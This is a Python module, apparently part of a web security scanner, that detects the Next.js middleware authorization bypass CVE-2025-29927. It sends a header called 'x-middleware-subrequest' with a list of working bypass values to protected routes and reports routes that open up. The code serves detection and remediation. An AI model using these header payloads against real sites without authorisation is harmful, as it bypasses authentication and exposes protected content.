"""Next.js middleware authorization bypass — CVE-2025-29927 (non-destructive).

Next.js trusts an internal header `x-middleware-subrequest` to short-circuit
middleware (used to prevent infinite loops). Versions < 12.3.5 / 13.5.9 /
14.2.25 / 15.2.3 let an attacker set it on a normal request to skip middleware
auth entirely. CVSS 9.1.

Detection (read-only): take a route that middleware GATES (redirects to login or
returns 401/403), resend it with the magic header, and flag if the gate
disappears (a 2xx where the baseline denied). Only runs when Next.js is
fingerprinted. We send a single header on a GET — nothing is modified.

Ref: https://nvd.nist.gov/vuln/detail/CVE-2025-29927
"""
from __future__ import annotations

from typing import List
from urllib.parse import urlparse

from ..http import Client
from ..utils import dedup_keep_order, log
from . import Finding

# Known values that satisfy the vulnerable comparison across versions/layouts.
_HEADER = "x-middleware-subrequest"
_PAYLOADS = [
    "middleware",
    "src/middleware",
    "pages/_middleware",
    "middleware:middleware:middleware:middleware:middleware",
    "src/middleware:src/middleware:src/middleware:src/middleware:src/middleware",
]
_GATED = {301, 302, 303, 307, 308, 401, 403}


def _is_nextjs(fingerprints: List[dict]) -> bool:
    for fp in fingerprints:
        if "next.js" in [t.lower() for t in fp.get("technologies", [])]:
            return True
    return False


def check(client: Client, gated_urls: List[str], fingerprints: List[dict]) -> List[Finding]:
    if not _is_nextjs(fingerprints) or not gated_urls:
        return []
    targets = dedup_keep_order(gated_urls)[:10]
    log("info", f"Next.js CVE-2025-29927 middleware-bypass test on {len(targets)} gated route(s)")
    findings: List[Finding] = []

    for url in targets:
        base = client.get(url, phase="active", allow_redirects=False)
        if not base.ok or base.status not in _GATED:
            continue
        for payload in _PAYLOADS:
            r = client.get(url, phase="active", allow_redirects=False,
                           extra_headers={_HEADER: payload})
            if r.ok and 200 <= r.status < 300 and r.status != base.status:
                findings.append(Finding(
                    title="Next.js middleware auth bypass (CVE-2025-29927)",
                    severity="critical", category="cve", target=url,
                    evidence=f"baseline {base.status} -> {r.status} with "
                             f"'{_HEADER}: {payload}' (middleware skipped)",
                    recommendation=("CRITICAL: confirm the protected content/route is "
                                    "now reachable, then report. Upgrade Next.js "
                                    "(>=15.2.3/14.2.25/13.5.9/12.3.5) or strip the "
                                    "x-middleware-subrequest header at the edge."),
                    confidence="firm"))
                log("vuln", f"[critical] CVE-2025-29927 bypass: {url} ({base.status}->{r.status})")
                break
    return findings
